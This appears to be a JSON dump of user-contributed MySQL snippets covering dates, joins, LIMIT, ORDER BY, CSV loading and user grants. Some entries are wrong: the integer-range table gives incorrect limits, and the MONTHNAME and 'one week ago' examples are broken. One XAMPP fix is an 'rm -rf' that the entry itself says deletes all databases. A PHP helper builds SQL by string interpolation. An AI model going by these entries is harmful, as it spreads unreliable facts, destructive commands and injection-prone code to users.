    "description": " .... where yourdate_column > DATE_SUB(now(), INTERVAL 6 MONTH)\n",
    "reg_date": "2021-10-12T09:57:23.000Z"
  },
  {
    "id": 2238,
    "keyword": null,
    "link": null,
    "title": " mysql last 7 days including today",
    "description": "SELECT * FROM `account`  WHERE DATE(created_at) > (NOW() - INTERVAL 7 DAY) \n",
    "reg_date": "2021-10-12T09:57:23.000Z"
  },
  {
    "id": 2239,
    "keyword": null,
    "link": null,
    "title": " mysql last date",
    "description": "-- Max date for each model: SELECT model, max(date) FROM models GROUP BY model; -- All models matching the max date of the entire table: SELECT model, date FROM models WHERE date IN (SELECT max(date) FROM models); -- Same with model details: SELECT d.model, d.date, d.color, d.etc FROM models d WHERE d.date IN (SELECT max(d2.date) FROM models d2 WHERE d2.model=d.model); -- Faster with MySQL 8.0+ SELECT model, date, color, etc FROM (SELECT model, date, color, etc,    max(date) OVER (PARTITION BY model) max_date FROM models) predoc  WHERE date=max_date;\n",
    "reg_date": "2021-10-12T09:57:23.000Z"
  },
  {
    "id": 2240,
    "keyword": null,
    "link": null,
    "title": " mysql last day of next month",
    "description": "SELECT LAST_DAY(CURDATE());\t\t\t\t\t\t-- Current month SELECT LAST_DAY(CURDATE() - INTERVAL 1 MONTH);\t-- Previous month SELECT LAST_DAY(CURDATE() + INTERVAL 1 MONTH);\t-- Next month\n",
    "reg_date": "2021-10-12T09:57:23.000Z"
  },
  {
    "id": 2241,
    "keyword": null,
    "link": null,
    "title": " mysql last friday of current month",
    "description": "SELECT LAST_DAY(NOW()) - ((7 + WEEKDAY(LAST_DAY(NOW())) - 4) % 7); \n",
    "reg_date": "2021-10-12T09:57:23.000Z"
  },
  {
    "id": 2242,
    "keyword": null,
    "link": null,
    "title": " mysql last year",
    "description": "SELECT * FROM my_table WHERE YEAR(my_date) = YEAR(DATE_SUB(CURDATE(), INTERVAL 1 YEAR));\n",
    "reg_date": "2021-10-12T09:57:23.000Z"
  },
  {
    "id": 2243,
    "keyword": null,
    "link": null,
    "title": " mysql left join",
    "description": "/*Two tables: CUSTOMERS table and ORDERS table. ORDERS table contains STATUS attribute.*/ SELECT      customers.customerNumber,      customerName,      orderNumber,      status FROM     customers LEFT JOIN orders ON      orders.customerNumber = customers.customerNumber;\n-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\nSELECT bk1.book_name,bk1.isbn_no,bk1.book_price,bk1.pub_lang          FROM  book_mast bk1           LEFT JOIN book_mast bk2 ON bk1.book_price<bk2.book_price         WHERE bk2.pub_lang='German';\nSELECT      Student_details.*,     Attendance.* FROM     Student_details LEFT JOIN Attendance ON      Student_details.s_id = Attendance.s_id;\n",
    "reg_date": "2021-10-12T09:57:23.000Z"
  },
  {
    "id": 2244,
    "keyword": null,
    "link": null,
    "title": " mysql left join multiple tables",
    "description": "select   t.Topic,   t.Title,   count(distinct s.starID) as StarCount,   count(distinct m.User) as UserCount,   count(distinct m.messageID) as MessageCount from   Topics t   left join Messages m ON m.Topic = t.Topic   left join Stars_Given s ON s.Topic = t.Topic group by   t.Topic,   t.Title\n-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\nSELECT dashboard_data.headline, dashboard_data.message, dashboard_messages.image_id, images.filename FROM dashboard_data      INNER JOIN dashboard_messages          ON dashboard_message_id = dashboard_messages.id     INNER JOIN images         ON dashboard_messages.image_id = images.image_id \n",
    "reg_date": "2021-10-12T09:57:23.000Z"
  },
  {
    "id": 2245,
    "keyword": null,
    "link": null,
    "title": " mysql length string",
    "description": "-- Relevant for MySQL only  -- syntax LENGTH(<your-string>)  -- example LENGTH('CountCharacters') -- OUTPUT: 15         123456789012345  -- example with query  SELECT 'CountCharacters',LENGTH('CountCharacters') FROM DUAL;  -- OUTPUT: CountCharacters, 15\nSELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql / PostGreSQL SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\n",
    "reg_date": "2021-10-12T09:57:24.000Z"
  },
  {
    "id": 2246,
    "keyword": null,
    "link": null,
    "title": " mysql like case sensitive",
    "description": "-- Use BINARY to make LIKE sensitive SELECT 'abc' LIKE BINARY 'ABC';\t\t-- 0\n",
    "reg_date": "2021-10-12T09:57:24.000Z"
  },
  {
    "id": 2247,
    "keyword": null,
    "link": null,
    "title": " mysql like in",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\nSELECT name FROM products WHERE name LIKE '%Value1' OR name LIKE '%Value2';\t \nThe LIKE operator is a logical operator that tests whether a string contains a specified pattern or not. Here is the syntax of the LIKE operator:  expression LIKE pattern ESCAPE escape_character  This example uses the LIKE operator to find employees whose first names start with a:  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     firstName LIKE 'a%';          This example uses the LIKE operator to find employees whose last names end with on e.g., Patterson, Thompson:  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     lastName LIKE '%on';               For example, to find all employees whose last names contain on , you use the following query with the pattern %on%  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     lastname LIKE '%on%';\nSELECT * from fiberbox where field REGEXP '1740|1938|1940'; \n",
    "reg_date": "2021-10-12T09:57:24.000Z"
  },
  {
    "id": 2248,
    "keyword": null,
    "link": null,
    "title": " mysql limit",
    "description": "SELECT * FROM `members` LIMIT 1, 2; or  $sql = \"SELECT * FROM Orders LIMIT 30\";\nSELECT <select_list> FROM <table_name> LIMIT [offset,] row_count;\nSELECT * FROM `members` LIMIT 1, 2;\nSELECT * FROM table LIMIT 50, 10;\n",
    "reg_date": "2021-10-12T09:57:24.000Z"
  },
  {
    "id": 2249,
    "keyword": null,
    "link": null,
    "title": " mysql limit and offset",
    "description": "SELECT * FROM  users LIMIT 50, 10; #offsets by 50, and limits to 10 results\nSELECT * FROM `members` LIMIT 1, 2;\n",
    "reg_date": "2021-10-12T09:57:24.000Z"
  },
  {
    "id": 2250,
    "keyword": null,
    "link": null,
    "title": " mysql limit results to 10",
    "description": "SELECT      customerNumber,      customerName,      creditLimit FROM     customers ORDER BY creditLimit DESC LIMIT 10;\n",
    "reg_date": "2021-10-12T09:57:24.000Z"
  },
  {
    "id": 2251,
    "keyword": null,
    "link": null,
    "title": " mysql limit rows",
    "description": "-- MySql SELECT * FROM emp ORDER BY sal DESC LIMIT 5;\t -- SQL Server  SELECT TOP 5 * FROM emp ORDER BY sal DESC;\t -- Oracle < 11g  SELECT * FROM ( SELECT * FROM emp ORDER BY sal DESC ) WHERE ROWNUM <= 5; -- Oracle 12c + SELECT * FROM emp ORDER BY sal DESC FETCH FIRST 5 ROWS ONLY;\t\nSELECT * FROM `members` LIMIT 1, 2; or  $sql = \"SELECT * FROM Orders LIMIT 30\";\nSELECT * FROM `members` LIMIT 1, 2;\n",
    "reg_date": "2021-10-12T09:57:24.000Z"
  },
  {
    "id": 2252,
    "keyword": null,
    "link": null,
    "title": " mysql list bigger table",
    "description": "SELECT \ttable_schema AS `Database`, \ttable_name AS `Table`, \tround(((data_length + index_length) / 1024 / 1024), 2) `Size in MB` FROM \tinformation_schema.TABLES ORDER BY \t(data_length + index_length) \tDESC; \n",
    "reg_date": "2021-10-12T09:57:24.000Z"
  },
  {
    "id": 2253,
    "keyword": null,
    "link": null,
    "title": " mysql list databases",
    "description": "SHOW DATABASES;\nSELECT DATABASE();\n",
    "reg_date": "2021-10-12T09:57:24.000Z"
  },
  {
    "id": 2254,
    "keyword": null,
    "link": null,
    "title": " mysql list users on ubuntu",
    "description": "SELECT User FROM mysql.user;\n",
    "reg_date": "2021-10-12T09:57:24.000Z"
  },
  {
    "id": 2255,
    "keyword": null,
    "link": null,
    "title": " mysql load csv into table",
    "description": "LOAD DATA INFILE 'c:/tmp/discounts.csv'  INTO TABLE discounts  FIELDS TERMINATED BY ','  ENCLOSED BY '\"' LINES TERMINATED BY '\\n' IGNORE 1 ROWS;\n",
    "reg_date": "2021-10-12T09:57:25.000Z"
  },
  {
    "id": 2256,
    "keyword": null,
    "link": null,
    "title": " mysql load data infile csv",
    "description": "LOAD DATA LOCAL INFILE 'abc.csv' INTO TABLE abc FIELDS TERMINATED BY ','  ENCLOSED BY '\"'  LINES TERMINATED BY '\\n' IGNORE 1 LINES (col1, col2, col3, col4, col5...);\n",
    "reg_date": "2021-10-12T09:57:25.000Z"
  },
  {
    "id": 2257,
    "keyword": null,
    "link": null,
    "title": " mysql load sql from file",
    "description": " mysql> use db_name;  mysql> source file_name.sql;\n",
    "reg_date": "2021-10-12T09:57:25.000Z"
  },
  {
    "id": 2258,
    "keyword": null,
    "link": null,
    "title": " mysql locate",
    "description": "POSITION(substr IN str) \n/*return position of substring in string: 0 is no match, 1=start of string*/ SELECT LOCATE(\"world\", \"hello world\");   /*will return position of bob in full_name,  0 means no bob in full_name. 1 means full_name starts with bob */ SELECT LOCATE(\"bob\", full_name) as bob_position from users; \n",
    "reg_date": "2021-10-12T09:57:25.000Z"
  },
  {
    "id": 2259,
    "keyword": null,
    "link": null,
    "title": " mysql login console",
    "description": "mysql -u USERNAME -p\nuse DBNAME;\n",
    "reg_date": "2021-10-12T09:57:25.000Z"
  },
  {
    "id": 2260,
    "keyword": null,
    "link": null,
    "title": " mysql loop",
    "description": "-- MySQL LOOP, ITERATE, LEAVE, loop label CREATE PROCEDURE LoopDemo() BEGIN \tDECLARE x  INT; \tDECLARE str  VARCHAR(255); \tSET x = 1; \tSET str =  ''; \tloop_label:  LOOP \t\tIF  x > 10 THEN  \t\t\tLEAVE  loop_label; \t\tEND  IF; \t\tSET  x = x + 1; \t\tIF  (x mod 2) THEN \t\t\tITERATE  loop_label; \t\tELSE \t\t\tSET  str = CONCAT(str,x,','); \t\tEND  IF; \tEND LOOP; \tSELECT str; END$$\n",
    "reg_date": "2021-10-12T09:57:25.000Z"
  },
  {
    "id": 2261,
    "keyword": null,
    "link": null,
    "title": " mysql max",
    "description": "SELECT MIN(salary), MAX(salary) FROM employees; SELECT team, MIN(salary), MAX(salary) FROM employees GROUP BY team;\nUSE world; SELECT MAX(Population) AS 'Maximum Value' FROM City WHERE CountryCode = 'THA';\n",
    "reg_date": "2021-10-12T09:57:25.000Z"
  },
  {
    "id": 2262,
    "keyword": null,
    "link": null,
    "title": " mysql max date",
    "description": "-- Max date for each model: SELECT model, max(date) FROM models GROUP BY model; -- All models matching the max date of the entire table: SELECT model, date FROM models WHERE date IN (SELECT max(date) FROM models); -- Same with model details: SELECT d.model, d.date, d.color, d.etc FROM models d WHERE d.date IN (SELECT max(d2.date) FROM models d2 WHERE d2.model=d.model); -- Faster with MySQL 8.0+ SELECT model, date, color, etc FROM (SELECT model, date, color, etc,    max(date) OVER (PARTITION BY model) max_date FROM models) predoc  WHERE date=max_date;\n",
    "reg_date": "2021-10-12T09:57:25.000Z"
  },
  {
    "id": 2263,
    "keyword": null,
    "link": null,
    "title": " mysql mediumint max value",
    "description": "--\t\t\tSIGNED\t\t\t\t\t\t\t\t\t\t  UNSIGNED --\t\t\tMin               \t\tMax                   Min Max TINYINT     -128                    127                   0   255 SMALLINT    -32767                  32767                 0   65535 MEDIUMINT   -8388608                388608                0   16777215 INT         -2147483648             2147483647            0   4294967295 INTEGER     -2147483648             2147483647            0   4294967295 BIGINT      -9223372036854775808    9223372036854775808   0   18446744073709551615\n",
    "reg_date": "2021-10-12T09:57:25.000Z"
  },
  {
    "id": 2264,
    "keyword": null,
    "link": null,
    "title": " mysql milliseconds",
    "description": "SELECT UNIX_TIMESTAMP();\n",
    "reg_date": "2021-10-12T09:57:25.000Z"
  },
  {
    "id": 2265,
    "keyword": null,
    "link": null,
    "title": " mysql min value row",
    "description": "SELECT t1.* FROM employees t1 INNER JOIN (     SELECT id, min(salary) AS salary FROM employees GROUP BY id ) t2 ON t1.id = t2.id AND t1.salary = t2.salary;\n",
    "reg_date": "2021-10-12T09:57:25.000Z"
  },
  {
    "id": 2266,
    "keyword": null,
    "link": null,
    "title": " mysql modify default value",
    "description": "ALTER DATABASE databasename CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; ALTER TABLE tablename CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;\nALTER TABLE tbl_name ALTER column_name SET DEFAULT new_value;\nmysql> SHOW VARIABLES LIKE 'char%'; SHOW VARIABLES LIKE 'collation%'; +--------------------------+----------------------------+ | Variable_name            | Value                      | +--------------------------+----------------------------+ | character_set_client     | utf8mb4                    | | character_set_connection | utf8mb4                    | | character_set_database   | utf8mb4                    | | character_set_filesystem | binary                     | | character_set_results    | utf8mb4                    | | character_set_server     | utf8mb4                    | | character_set_system     | utf8                       | | character_sets_dir       | /usr/share/mysql/charsets/ | +--------------------------+----------------------------+ 8 rows in set (0.00 sec)  +----------------------+--------------------+ | Variable_name        | Value              | +----------------------+--------------------+ | collation_connection | utf8mb4_general_ci | | collation_database   | utf8mb4_unicode_ci | | collation_server     | utf8mb4_unicode_ci | +----------------------+--------------------+ 3 rows in set (0.00 sec)\nCREATE TABLE table_name(    column_name data_type,    Column_name data_type DEFAULT &lsquo;value&rsquo; );\n",
    "reg_date": "2021-10-12T09:57:26.000Z"
  },
  {
    "id": 2267,
    "keyword": null,
    "link": null,
    "title": " mysql modify foreign key",
    "description": "-- 2 Step process ALTER TABLE tbl_name_1 DROP FOREIGN KEY fk_name; ALTER TABLE tbl_name_1 ADD FOREIGN KEY fk_name(fk_col)             REFERENCES tbl_name_2(pk_name) ON DELETE RESTRICT;   -- Use to find the name of the FOREIGN KEY  SHOW CREATE TABLE tbl_name;\nALTER TABLE ordenes ADD ticket VARCHAR(50) NOT NULL; ALTER TABLE ordenes ADD CONSTRAINT fk_ticket FOREIGN KEY (ticket) REFERENCES tickets(ticket); // I'm Horrible Hyena\nALTER TABLE ordenes ADD ticket VARCHAR(50) NOT NULL; ALTER TABLE ordenes ADD CONSTRAINT fk_ticket FOREIGN KEY (ticket) REFERENCES tickets(ticket); \n",
    "reg_date": "2021-10-12T09:57:26.000Z"
  },
  {
    "id": 2268,
    "keyword": null,
    "link": null,
    "title": " mysql money value",
    "description": "decimal(15,2)\n90000000$\n",
    "reg_date": "2021-10-12T09:57:26.000Z"
  },
  {
    "id": 2269,
    "keyword": null,
    "link": null,
    "title": " mysql month name extract",
    "description": "SELECT MONTHNAME(column_date,&rsquo;%m&rsquo;)) as monthname from tablename;\n",
    "reg_date": "2021-10-12T09:57:26.000Z"
  },
  {
    "id": 2270,
    "keyword": null,
    "link": null,
    "title": " mysql monthname",
    "description": "SELECT MONTHNAME(\"2017-06-15\");\n",
    "reg_date": "2021-10-12T09:57:26.000Z"
  },
  {
    "id": 2271,
    "keyword": null,
    "link": null,
    "title": " mysql multiple order by",
    "description": "    SELECT     column_name1, column_name2, column_name3 FROM     table_name ORDER BY     column_name1 [ASC|DESC],     column_name2 [ASC|DESC],    ...;\nORDER BY col1, col2 DESC, col3;\n",
    "reg_date": "2021-10-12T09:57:26.000Z"
  },
  {
    "id": 2272,
    "keyword": null,
    "link": null,
    "title": " mysql multiple primary keys",
    "description": "CREATE TABLE userdata (   userid INT,   userdataid INT,   info char(200),   primary key (userid, userdataid) ); \n",
    "reg_date": "2021-10-12T09:57:26.000Z"
  },
  {
    "id": 2273,
    "keyword": null,
    "link": null,
    "title": " mysql multiple set statements",
    "description": "UPDATE tablename SET column1 = \"value1\", column2 = \"value2\" ....\n",
    "reg_date": "2021-10-12T09:57:26.000Z"
  },
  {
    "id": 2274,
    "keyword": null,
    "link": null,
    "title": " mysql multiply",
    "description": "SELECT      Pieces, Price,      Pieces * Price as 'Total'  FROM myTable\nupdate products set price = price * 2;\n",
    "reg_date": "2021-10-12T09:57:26.000Z"
  },
  {
    "id": 2275,
    "keyword": null,
    "link": null,
    "title": " mysql not a group by clause",
    "description": "SELECT a, b, sum(c) FROM my_table GROUP BY a;\t\t-- Error SELECT a, b, sum(c) FROM my_table GROUP BY a, b;\t-- OK, all expressions there -- CASE WHEN statement, for example: SELECT a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END AS r, sum(c)  FROM my_table GROUP BY a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END;\t\t-- No alias name (r)\n",
    "reg_date": "2021-10-12T09:57:26.000Z"
  },
  {
    "id": 2276,
    "keyword": null,
    "link": null,
    "title": " mysql not equal",
    "description": "DELETE FROM konta WHERE taken <> '';\nSELECT book_name FROM book_mast WHERE pub_lang != \"English\";\n",
    "reg_date": "2021-10-12T09:57:27.000Z"
  },
  {
    "id": 2277,
    "keyword": null,
    "link": null,
    "title": " mysql not in list",
    "description": "#filter in MySQL: WHERE id_field not in ('817','803','495') \nUPDATE table SET available=1 WHERE available=0    AND id NOT IN (id1, id2, id3,...); \n",
    "reg_date": "2021-10-12T09:57:27.000Z"
  },
  {
    "id": 2278,
    "keyword": null,
    "link": null,
    "title": " mysql not starting in xampp",
    "description": "sudo service mysql stop sudo /opt/lampp/lampp restart \nsudo rm -rf ~/.bitnami  // type this command in your terminal. //THIS WILL SOLVE THIS PROBLEM BUT WILL DELETE ALL YOUR DATABASES\n18   1 If you have MySQL already installed on your windows then go to services.msc file on your windows and right click the MySQL file and stop the service, now open your XAMPP and start MySQL. Now MySQL will start on the port 3306.\n",
    "reg_date": "2021-10-12T09:57:27.000Z"
  },
  {
    "id": 2279,
    "keyword": null,
    "link": null,
    "title": " mysql now format",
    "description": "SELECT DATE_FORMAT(NOW(),'%Y-%m-%d %H-%i-%s')\n",
    "reg_date": "2021-10-12T09:57:27.000Z"
  },
  {
    "id": 2280,
    "keyword": null,
    "link": null,
    "title": " mysql num fields in mysqli",
    "description": " $fieldcount=mysqli_num_fields($result);\n",
    "reg_date": "2021-10-12T09:57:27.000Z"
  },
  {
    "id": 2281,
    "keyword": null,
    "link": null,
    "title": " mysql offset",
    "description": "SELECT * FROM  users LIMIT 50, 10; #offsets by 50, and limits to 10 results\nSELECT * FROM `members` LIMIT 1, 2; or  $sql = \"SELECT * FROM Orders LIMIT 30\";\nSELECT * FROM `members` LIMIT 1, 2;\n SELECCIONAR {nombre de campo (s) | *} FROM tableName (s) [WHERE condici&oacute;n] LIMIT N; \n",
    "reg_date": "2021-10-12T09:57:27.000Z"
  },
  {
    "id": 2282,
    "keyword": null,
    "link": null,
    "title": " mysql on delete set null",
    "description": "SET foreign_key_checks = 0; UPDATE languages SET id='xyz' WHERE id='abc'; UPDATE categories_languages SET language_id='xyz' WHERE language_id='abc'; SET foreign_key_checks = 1;\n     FOREIGN KEY (child_col1, child_col2, ... child_col_n)     REFERENCES parent_table (parent_col1, parent_col2, ... parent_col_n)     ON DELETE SET NULL     [ ON UPDATE { NO ACTION | CASCADE | SET NULL | SET DEFAULT } ]  \n",
    "reg_date": "2021-10-12T09:57:27.000Z"
  },
  {
    "id": 2283,
    "keyword": null,
    "link": null,
    "title": " mysql on duplicate key ignore",
    "description": "INSERT INTO t1 (a,b,c) VALUES (1,2,3)   ON DUPLICATE KEY UPDATE c=3; INSERT INTO t1 (a,b,c) VALUES (4,5,6)   ON DUPLICATE KEY UPDATE c=9;\nINSERT INTO table_tags (tag) VALUES ('tag_a'),('tab_b'),('tag_c') ON DUPLICATE KEY UPDATE tag=tag; \nUPDATE t1 SET c=c+1 WHERE a=1 OR b=2 LIMIT 1;\n",
    "reg_date": "2021-10-12T09:57:27.000Z"
  },
  {
    "id": 2284,
    "keyword": null,
    "link": null,
    "title": " mysql on duplicate key update",
    "description": "INSERT INTO table_name(c1) VALUES(c1) ON DUPLICATE KEY UPDATE c1 = VALUES(c1) + 1;\nINSERT INTO t1 (a,b,c) VALUES (1,2,3)   ON DUPLICATE KEY UPDATE c=3; INSERT INTO t1 (a,b,c) VALUES (4,5,6)   ON DUPLICATE KEY UPDATE c=9;\nINSERT INTO `tableName` (`a`,`b`,`c`) VALUES (1,2,3) ON DUPLICATE KEY UPDATE `a`=VALUES(`a`), `b`=VALUES(`b`), `c`=VALUES(`c`); \nINSERT INTO table_tags (tag) VALUES ('tag_a'),('tab_b'),('tag_c') ON DUPLICATE KEY UPDATE tag=tag; \nUPDATE t1 SET c=c+1 WHERE a=1 OR b=2 LIMIT 1;\n",
    "reg_date": "2021-10-12T09:57:27.000Z"
  },
  {
    "id": 2285,
    "keyword": null,
    "link": null,
    "title": " mysql on duplicate key update get value from values",
    "description": "INSERT INTO t1 (a,b,c) VALUES (1,2,3)   ON DUPLICATE KEY UPDATE c=3; INSERT INTO t1 (a,b,c) VALUES (4,5,6)   ON DUPLICATE KEY UPDATE c=9;\nINSERT INTO `tableName` (`a`,`b`,`c`) VALUES (1,2,3) ON DUPLICATE KEY UPDATE `a`=VALUES(`a`), `b`=VALUES(`b`), `c`=VALUES(`c`); \nUPDATE t1 SET c=c+1 WHERE a=1 OR b=2 LIMIT 1;\n",
    "reg_date": "2021-10-12T09:57:28.000Z"
  },
  {
    "id": 2286,
    "keyword": null,
    "link": null,
    "title": " mysql on update current timestamp",
    "description": "Press CTRL+C to copy CREATE TABLE t1 (   ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,   dt DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP );\nALTER TABLE whatevertable      CHANGE whatevercolumn              whatevercolumn TIMESTAMP NOT NULL                            DEFAULT CURRENT_TIMESTAMP                             ON UPDATE CURRENT_TIMESTAMP;\n",
    "reg_date": "2021-10-12T09:57:28.000Z"
  },
  {
    "id": 2287,
    "keyword": null,
    "link": null,
    "title": " mysql one week ago",
    "description": "select *  from orders  where order_date >= DATE_SUB(NOW(),INTERVAL 1 YEAR);\nselect id from tbname  where date between date_sub(now(),INTERVAL 1 WEEK) and now();\nSELECT sysdate() - 7; \t\t\t\t-- 1 week ago   12/01/2021 14:27:27 SELECT date(sysdate() - 7); \t\t-- 1 week ago   12/01/2021 00:00:00  SELECT * FROM my_table WHERE my_datecol > date(sysdate() - 7);\nDAYOFWEEK(date) \nDAYOFWEEK();//(1 for Sunday,2 for Monday &acirc;&euro;&brvbar;&acirc;&euro;&brvbar; 7 for Saturday )\n",
    "reg_date": "2021-10-12T09:57:28.000Z"
  },
  {
    "id": 2288,
    "keyword": null,
    "link": null,
    "title": " mysql optimize table",
    "description": "OPTIMIZE TABLE [table]\n",
    "reg_date": "2021-10-12T09:57:28.000Z"
  },
  {
    "id": 2289,
    "keyword": null,
    "link": null,
    "title": " mysql order",
    "description": "SELECT column_name(s) FROM table_name ORDER BY column_name(s) ASC|DESC \nSELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t\t-- col1 DESC then col2 ASC\n    SELECT     column_name1, column_name2, column_name3 FROM     table_name ORDER BY     column_name1 [ASC|DESC],     column_name2 [ASC|DESC],    ...;\nTo get the sorted result from MySQL select statement we use order by clause with SELECT statement.  Syntax: SELECT column_list FROM tablename ORDER BY column_name1 [ASC][DESC],column_name2 [ASC][DESC],...\nSELECT     select_list FROM     table_name ORDER BY     column1 [ASC|DESC],     column2 [ASC|DESC],    ...;\nSELECT * FROM adminra_RepAda.customerServiceRequests order by insertDate DESC;\n",
    "reg_date": "2021-10-12T09:57:28.000Z"
  },
  {
    "id": 2290,
    "keyword": null,
    "link": null,
    "title": " mysql order by",
    "description": "SELECT column_name(s) FROM table_name ORDER BY column_name(s) ASC|DESC \nSELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t\t-- col1 DESC then col2 ASC\n    SELECT     column_name1, column_name2, column_name3 FROM     table_name ORDER BY     column_name1 [ASC|DESC],     column_name2 [ASC|DESC],    ...;\nTo get the sorted result from MySQL select statement we use order by clause with SELECT statement.  Syntax: SELECT column_list FROM tablename ORDER BY column_name1 [ASC][DESC],column_name2 [ASC][DESC],...\nSELECT     select_list FROM     table_name ORDER BY     column1 [ASC|DESC],     column2 [ASC|DESC],    ...;\nSELECT * FROM adminra_RepAda.customerServiceRequests order by insertDate DESC;\n",
    "reg_date": "2021-10-12T09:57:28.000Z"
  },
  {
    "id": 2291,
    "keyword": null,
    "link": null,
    "title": " mysql order by desc null last",
    "description": "SELECT * FROM user   ORDER BY COALESCE(name, 'zz') DESC \n",
    "reg_date": "2021-10-12T09:57:28.000Z"
  },
  {
    "id": 2292,
    "keyword": null,
    "link": null,
    "title": " mysql order by field",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2 ASC;\t-- col1 DESC then col2 ASC\n",
    "reg_date": "2021-10-12T09:57:28.000Z"
  },
  {
    "id": 2293,
    "keyword": null,
    "link": null,
    "title": " mysql order by multiple columns",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t\t-- col1 DESC then col2 ASC\n    SELECT     column_name1, column_name2, column_name3 FROM     table_name ORDER BY     column_name1 [ASC|DESC],     column_name2 [ASC|DESC],    ...;\nORDER BY col1, col2 DESC, col3;\n",
    "reg_date": "2021-10-12T09:57:29.000Z"
  },
  {
    "id": 2294,
    "keyword": null,
    "link": null,
    "title": " mysql order by rand limit 1 really slow",
    "description": "function get_random_row($mytable,$conn){ \t$table_max_id = $conn->query(\"SELECT id FROM $mytable ORDER BY id DESC LIMIT 0, 1\")[0][\"id\"]; \t$rand_id=rand(1,$table_max_id); \t$random_result = $conn->query(\"select * from $mytable where id = $rand_id\");   \t \t#note: if you are missing some id's, we can call again until we get hit   \tif(!$random_result){     \treturn get_random_row($mytable,$conn);     }      \treturn $random_result; }\n",
    "reg_date": "2021-10-12T09:57:29.000Z"
  },
  {
    "id": 2295,
    "keyword": null,
    "link": null,
    "title": " mysql order by two columns priority",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t\t-- col1 DESC then col2 ASC\n",
    "reg_date": "2021-10-12T09:57:29.000Z"
  },
  {
    "id": 2296,
    "keyword": null,
    "link": null,
    "title": " mysql out of range value for column",
    "description": "cust_fax integer(10) NOT NULL,\n",
    "reg_date": "2021-10-12T09:57:29.000Z"
  },
  {
    "id": 2297,
    "keyword": null,
    "link": null,
    "title": " mysql output csv",
    "description": "-- If you are using linux,  SELECT id, filename FROM attachments INTO OUTFILE '/tmp/results.csv' FIELDS TERMINATED BY ',' ENCLOSED BY '\"' LINES TERMINATED BY '\\n'; -- and find the csv file /tmp\nmysqldump db_name tbl_name;\n",
    "reg_date": "2021-10-12T09:57:29.000Z"
  },
  {
    "id": 2298,
    "keyword": null,
    "link": null,
    "title": " mysql pad zeros",
    "description": "SELECT LPAD(last4, 4, '0') as last4 FROM numbers;\n",
    "reg_date": "2021-10-12T09:57:29.000Z"
  },
  {
    "id": 2299,
    "keyword": null,
    "link": null,
    "title": " mysql parse int",
    "description": "SELECT field,CONVERT(field,UNSIGNED INTEGER) AS num FROM table;\nSELECT CAST(PROD_CODE AS INT) FROM PRODUCT\nSELECT CAST(aField as UNSIGNED) from table;  -- for VARCHAR use CHAR(50), INT use UNSIGNED\n",
    "reg_date": "2021-10-12T09:57:29.000Z"
  },
  {
    "id": 2300,
    "keyword": null,
    "link": null,
    "title": " mysql password error create datbase",
    "description": "use mysql; CREATE USER 'username'@'localhost' IDENTIFIED BY 'password'; GRANT ALL ON *.* TO 'username'@'localhost'; flush privileges; \nuse mysql;   DROP USER 'jeffrey'@'localhost'; # FOR DELETING USER #error 1396  DROP DATABASE databasename # TO DELETE DATABASE #error 1007    CREATE USER 'username'@'localhost' IDENTIFIED BY 'password'; GRANT ALL ON *.* TO 'username'@'localhost'; flush privileges;  CREATE USER 'wordpressuser'@'localhost' IDENTIFIED BY 'password'; # Remember the quote in used is not around the @ symbol, and it is not &lsquo; &rsquo;  #  but ' '.  #  And the first thing to do is to provide  #  the user with access to the information this wordpressuser will need.  GRANT ALL PRIVILEGES ON * . * TO 'wordpressuser'@'localhost';  # The asterisks in this command refer to the database and table (respectively) # that they can access&mdash;this specific command allows to the user to read, edit, execute and perform all tasks across all the databases and tables.  # Once you have finalized the permissions 